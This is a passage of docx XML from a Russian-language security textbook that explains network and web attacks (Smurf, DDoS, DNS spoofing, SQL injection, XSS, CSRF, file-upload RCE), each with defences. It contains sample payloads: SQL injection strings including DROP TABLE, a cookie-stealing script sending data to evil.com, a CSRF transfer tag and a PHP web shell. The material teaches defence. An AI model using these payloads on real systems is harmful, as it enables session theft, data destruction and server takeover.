        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Но исходящий IP подделан → указан IP жертвы `10.0.0.5`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Все устройства в сети `192.168.1.x` отвечают на ping → отправляют ответы на `10.0.0.5`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Жертва получает тысячи ICMP-ответов → перегрузка (DoS)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Защита</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Ingress filtering** (блокировать пакеты с поддельным source IP)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Не использовать broadcast в сети</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>DDoS (Distributed Denial of Service) — Распределённая атака отказа в обслуживании</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Определение</w:t>
      </w:r>
      <w:r>
        <w:t>: Перегрузка сервера огромным количеством запросов с целью сделать сайт недоступным.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как работает:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">Ботнет (100,000 заражённых компьютеров) </w:t>
        <w:br/>
        <w:t xml:space="preserve">   → одновременно отправляют запросы на твой сайт </w:t>
        <w:br/>
        <w:t xml:space="preserve">   → сервер не справляется → сайт падает</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Типы DDoS</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Volumetric Attack** (объёмная атака):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Цель: забить канал трафиком</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Пример: UDP flood (отправка гигабайтов UDP-пакетов)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Мощность: 1 Тбит/сек (GitHub DDoS 2018)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Protocol Attack** (атака на протоколы):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Цель: исчерпать ресурсы сервера (CPU, память)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Пример: **SYN Flood** (отправка тысяч TCP SYN, но не завершение рукопожатия → сервер держит полуоткрытые соединения → память кончается)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Application Layer Attack** (атака на приложение):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Цель: перегрузить веб-приложение</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Пример: отправка запросов на тяжёлую страницу (поиск по БД) → сервер тратит CPU на обработку → падает</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Реальный пример — GitHub DDoS 2018</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**1.35 Тбит/сек** трафика (рекорд на тот момент)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Использовали **Memcached Amplification Attack** (отправка запроса на Memcached-серверы → они отвечают в 50,000 раз больше данных → весь ответ летит на GitHub)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>GitHub использовал **Cloudflare** (защита от DDoS) → атаку отбили за 10 минут</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Защита</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**CDN** (Content Delivery Network): Cloudflare, Akamai (распределяют трафик по дата-центрам)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Rate limiting** (ограничение запросов с одного IP)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**WAF** (Web Application Firewall) — блокирует подозрительные запросы</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Anycast** (один IP → несколько серверов по миру → трафик распределяется)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>DNS Spoofing / DNS Cache Poisoning (Отравление кэша DNS)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Определение</w:t>
      </w:r>
      <w:r>
        <w:t>: Подмена DNS-записи, чтобы пользователь попал на фальшивый сайт.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как работает:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Ты вводишь `google.com` в браузере</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Компьютер спрашивает DNS-сервер: «Какой IP у google.com?»</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Хакер перехватывает запрос и подсунул фейковый ответ: `google.com → 6.6.6.6` (IP хакера)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Браузер открывает сайт на `6.6.6.6` → это поддельная страница Google, крадущая пароли</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Реальный пример — DNS Hijacking в Бразилии (2018)</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Хакеры взломали роутеры пользователей и изменили DNS-сервер на свой</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Когда пользователи заходили на банковские сайты → попадали на фишинговые копии</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Украдены десятки тысяч учётных данных</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Защита</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**DNSSEC** (цифровые подписи для DNS-записей)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Использовать публичные DNS (Google `8.8.8.8`, Cloudflare `1.1.1.1`)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Проверять SSL-сертификат (если сайт банка показывает недействительный сертификат → это фейк)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>9.5.4. Атаки на веб-приложения: Когда программист забыл проверить ввод</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>SQL Injection (SQL-инъекция)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Определение</w:t>
      </w:r>
      <w:r>
        <w:t>: Внедрение вредоносного SQL-кода в запрос к базе данных.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как работает:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Плохой код (уязвим к SQL-инъекции):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>$username = $_POST['username'];</w:t>
        <w:br/>
        <w:t>$password = $_POST['password'];</w:t>
        <w:br/>
        <w:t>$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Обычный вход:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>username: admin</w:t>
        <w:br/>
        <w:t>password: secret</w:t>
        <w:br/>
        <w:t>SQL: SELECT * FROM users WHERE username='admin' AND password='secret'</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Атака</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>username: admin' OR '1'='1' --</w:t>
        <w:br/>
        <w:t>password: anything</w:t>
        <w:br/>
        <w:t>SQL: SELECT * FROM users WHERE username='admin' OR '1'='1' --' AND password='anything'</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Что происходит:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`OR '1'='1'` — всегда истина → условие выполнено</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`--` — комментарий в SQL, всё после него игнорируется</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Результат: **вход без пароля**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ещё хуже:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>username: admin'; DROP TABLE users; --</w:t>
        <w:br/>
        <w:t>SQL: SELECT * FROM users WHERE username='admin'; DROP TABLE users; --'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">→ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Таблица users удалена</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Реальный пример — 2008, Heartland Payment Systems</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>SQL-инъекция в платёжной системе</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Украдено **130 миллионов** номеров кредитных карт</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Ущерб: **$140 миллионов**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Защита</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Prepared Statements** (параметризованные запросы):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  ```php</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  $stmt = $pdo-&gt;prepare("SELECT * FROM users WHERE username=? AND password=?");</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  $stmt-&gt;execute([$username, $password]);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  ```</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**ORM** (Object-Relational Mapping): Hibernate, Django ORM — автоматически экранируют спецсимволы</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Валидация ввода** (проверка, что username содержит только буквы/цифры)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Cross-Site Scripting (XSS)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Определение</w:t>
      </w:r>
      <w:r>
        <w:t>: Внедрение вредоносного JavaScript-кода на сайт.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как работает:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Сайт с комментариями (без фильтрации ввода):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>&lt;form action="/post_comment" method="POST"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  &lt;textarea name="comment"&gt;&lt;/textarea&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  &lt;button type="submit"&gt;Отправить&lt;/button&gt;</w:t>
        <w:br/>
        <w:t>&lt;/form&gt;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Хакер отправляет комментарий:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>&lt;script&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  fetch('http://evil.com/steal?cookie=' + document.cookie);</w:t>
        <w:br/>
        <w:t>&lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Теперь каждый, кто откроет страницу с этим комментарием, выполнит этот скрипт → его cookie (включая сессию) отправятся хакеру.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Типы XSS</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Reflected XSS** (отражённая):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Вредоносный код в URL: `http://site.com/search?q=&lt;script&gt;alert('XSS')&lt;/script&gt;`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Сайт отображает параметр `q` на странице → скрипт выполняется</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Stored XSS** (хранимая):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Вредоносный код сохранён в БД (комментарий, профиль пользователя)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Каждый, кто откроет страницу, выполнит скрипт</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**DOM-based XSS**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>JavaScript на странице динамически изменяет DOM, используя непроверенные данные</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Пример:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">     ```javascript</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">     document.getElementById('welcome').innerHTML = "Привет, " + location.hash;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">     ```</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">     URL: `http://site.com#&lt;img src=x onerror=alert('XSS')&gt;` → скрипт выполнится</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Реальный пример — MySpace Samy Worm (2005)</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Подросток Samy Kamkar внедрил XSS в свой профиль MySpace</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Код добавлял в друзья всех, кто посетит его профиль, и копировал себя на их страницы</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>За **20 часов** заразил **1 миллион профилей** (самый быстрорастущий вирус в истории)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>MySpace пришлось закрыть сайт на сутки для очистки</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Защита</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Экранирование ввода** (заменить `&lt;` на `&amp;lt;`, `&gt;` на `&amp;gt;`)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Content Security Policy (CSP)** — заголовок, запрещающий выполнение inline-скриптов:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  ```</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  Content-Security-Policy: script-src 'self'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  ```</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Использовать фреймворки с автоэкранированием (React, Vue, Django templates)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Cross-Site Request Forgery (CSRF) — Подделка запросов</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Определение</w:t>
      </w:r>
      <w:r>
        <w:t>: Атака, при которой злоумышленник заставляет жертву выполнить нежелательное действие на сайте, где она авторизована.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как работает:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Ты залогинен в онлайн-банке `mybank.com` (cookie с сессией сохранён в браузере)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Хакер присылает тебе email с картинкой:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   ```html</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   &lt;img src="http://mybank.com/transfer?to=hacker&amp;amount=1000000"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   ```</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Браузер автоматически загружает картинку → отправляет GET-запрос на `mybank.com`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Сервер видит твою валидную сессию (cookie) → выполняет перевод **$1,000,000** хакеру</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Защита</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**CSRF-токен** — случайная строка, проверяемая на сервере:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  ```html</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  &lt;form action="/transfer" method="POST"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    &lt;input type="hidden" name="csrf_token" value="x9Kq2mL7..."&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    &lt;input name="amount" value="100"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    &lt;button type="submit"&gt;Перевести&lt;/button&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  &lt;/form&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  ```</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  Хакер не знает токен → не может подделать форму</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**SameSite Cookie** — атрибут, запрещающий отправку cookie с других доменов:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  ```</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  Set-Cookie: session=abc123; SameSite=Strict</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  ```</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Remote Code Execution (RCE) — Удалённое выполнение кода</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Определение</w:t>
      </w:r>
      <w:r>
        <w:t>: Уязвимость, позволяющая выполнить произвольный код на сервере.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример — уязвимость в загрузке файлов</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Сайт позволяет загружать аватары (PNG/JPG). Но не проверяет расширение файла.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Хакер загружает файл `avatar.php`:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>&lt;?php system($_GET['cmd']); ?&gt;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Теперь хакер может выполнить любую команду:</w:t>
      </w:r>
    </w:p>
